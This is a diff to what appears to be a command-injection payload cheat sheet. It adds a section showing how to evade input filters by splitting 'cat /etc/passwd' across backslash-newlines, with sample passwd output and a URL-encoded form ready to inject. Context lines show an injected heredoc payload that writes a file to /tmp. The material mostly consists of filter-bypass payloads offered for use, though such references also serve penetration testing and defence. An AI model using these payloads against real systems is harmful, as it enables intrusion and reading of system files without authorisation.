@@ -12,6 +12,7 @@
 * [Filter Bypasses](#filter-bypasses)
   * [Bypass without space](#bypass-without-space)
   * [Bypass with a line return](#bypass-with-a-line-return)
+  * [Bypass with Backslash Newline](#bypass-with-backslash-newline)
   * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
   * [Bypass blacklisted words](#bypass-blacklisted-words)
    * [Bypass with single quote](#bypass-with-single-quote)
@@ -134,6 +135,25 @@ You can also write files.
 ;cat>/tmp/hi<<EOF%0ahello%0aEOF
 ;cat</tmp/hi
 hello
+```
+
+### Bypass with Backslash Newline
+
+Commands can be broken into parts by using backslash followed by a newline
+```powershell
+❯ cat /et\
+c/pa\
+sswd
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+[SNIP]
+```
+URL encoded form would look like this:
+```powershell
+cat%20/et%5C%0Ac/pa%5C%0Asswd
 ```
 
 ### Bypass characters filter via hex encoding
